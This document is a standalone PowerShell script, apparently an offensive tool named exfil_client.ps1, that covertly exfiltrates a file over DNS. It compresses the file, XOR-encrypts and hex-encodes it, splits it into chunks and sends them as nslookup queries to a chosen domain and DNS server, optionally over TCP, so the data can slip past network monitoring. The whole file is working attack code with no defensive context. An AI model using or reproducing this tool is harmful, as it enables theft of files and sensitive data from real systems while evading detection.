param (
    [string]$FilePath,
    [string]$Domain,
    [string]$DnsServerIp,
    [string]$Password,
    [switch]$UseTcp
)

function Show-Help {
    Write-Host "Usage: .\exfil_client.ps1 -FilePath <file_path> -Password <password> [-Domain <domain>] [-DnsServerIp <dns_server_ip>] [-UseTcp]"
    Write-Host "Exfiltrates a file over DNS by sending XOR-encrypted, base64 encoded chunks as DNS queries."
    Write-Host ""
    Write-Host "Parameters:"
    Write-Host "  -FilePath      Path to the file you want to exfiltrate."
    Write-Host "  -Password      Password to be used in XOR encryption."
    Write-Host "  -Domain        Domain to use in DNS queries."
    Write-Host "  -DnsServerIp   IP address of the DNS server."
    Write-Host "  -UseTcp        Optional switch to use TCP instead of UDP."
    Write-Host ""
    Write-Host "Example:"
    Write-Host '  .\exfil_client.ps1 -FilePath "C:\path\to\your\file" -Domain "example.com" -DnsServerIp "8.8.8.8" -Password "securepass" -UseTcp'
}

# Check if all required parameters are provided
if (-not $FilePath -or -not $Password -or -not (Test-Path $FilePath)) {
    Show-Help
    exit 1
}

# Function to XOR encrypt with password
function XOR-Encrypt {
    param (
        [byte[]]$data,
        [byte[]]$password
    )
    # Encrypt data with password
    $encryptedData = New-Object byte[] $data.Length
    for ($i = 0; $i -lt $data.Length; $i++) {
        $encryptedData[$i] = $data[$i] -bxor $password[$i % $password.Length]
    }
    return $encryptedData
}

# Read file content as bytes
$data = [System.IO.File]::ReadAllBytes($FilePath)

# Get filename from FilePath
$filename = Split-Path -Leaf $FilePath
$filenameBytes = [System.Text.Encoding]::UTF8.GetBytes($filename)

# Generate timestamp in format yyyyMMddHHmmss
$timestamp = Get-Date -Format "yyyyMMddHHmmss"

# Compress data using gzip
$compressedStream = New-Object System.IO.MemoryStream
$gzipStream = New-Object System.IO.Compression.GZipStream $compressedStream, ([IO.Compression.CompressionMode]::Compress)
$gzipStream.Write($data, 0, $data.Length)
$gzipStream.Close()

# Get compressed data as byte array
$compressedData = $compressedStream.ToArray()

Write-Host "[*] Encrypting file, please wait..."
# XOR encrypt compressed data with password
$passwordBytes = [System.Text.Encoding]::UTF8.GetBytes($Password)
$encryptedData = XOR-Encrypt -data $compressedData -password $passwordBytes

# Convert encryptedData to hexadecimal string
$hexencryptedData = -join ($encryptedData | ForEach-Object { "{0:X2}" -f $_ })

# Maximum DNS query size constraints
$labelMaxSize = 63
$requestMaxSize = 255

# Calculate space required for domain name and metadata
$domainNameLength = $Domain.Length + 3 # including the dots and subdomain
$metadataLength = "$filename|$timestamp".Length * 2  # length of filename in hexadecimal and buffer for the number of chunks

# Calculate maximum bytes available for data in each DNS query
$bytesLeft = $requestMaxSize - $metadataLength - $domainNameLength

# Calculate number of chunks
$nbChunks = [math]::Ceiling($hexencryptedData.Length / $bytesLeft)

Write-Host "[+] Maximum data exfiltrated per DNS request (chunk max size): [$bytesLeft] bytes"
Write-Host "[+] Number of chunks: [$nbChunks]"

# Split encrypted data into chunks and send DNS queries
$chunk_id = 0
$start_index = 0

Write-Host "[*] Sending file, please wait..."

while ($chunk_id -lt $nbChunks) {
    # Get the chunk from the encrypted data string
    $end_index = [Math]::Min($start_index + $bytesLeft, $hexencryptedData.Length)
    $chunk = $hexencryptedData.Substring($start_index, $end_index - $start_index)

    # Split hex_chunk into 4 equal chunks
    $chunkLength = [Math]::Ceiling($chunk.Length / 4)
    $chunks = @()

    for ($i = 0; $i -lt 4; $i++) {
        $startIndex = $i * $chunkLength
        $length = [Math]::Min($chunkLength, $chunk.Length - $startIndex)
        $chunks += $chunk.Substring($startIndex, $length)
    }

    # Construct DNS query
    $encryptedFilename = XOR-Encrypt -data $filenameBytes -password $passwordBytes
    $hex_filename = -join ($encryptedFilename | ForEach-Object { "{0:X2}" -f [byte][char]$_ })
    $metadata = "$hex_filename|$timestamp|$nbChunks"
    $subdomain = "$chunk_id.$($chunks[0]).$($chunks[1]).$($chunks[2]).$($chunks[3]).$metadata.$Domain."

    # Determine if -UseTcp switch is present
    $queryType = if ($UseTcp.IsPresent) { "-vc" } else { "" }
    
    # Send DNS query using nslookup
    nslookup $queryType -type=a $subdomain $DnsServerIp > $null 2>$null

    Write-Progress -Activity "Sending file in Progress" -Status "$chunk_id/$nbChunks chunks Complete:" -PercentComplete '100'

    # Move to next chunk
    $chunk_id++
    $start_index = $end_index
}
Write-Host "[+] Transfer complete!"
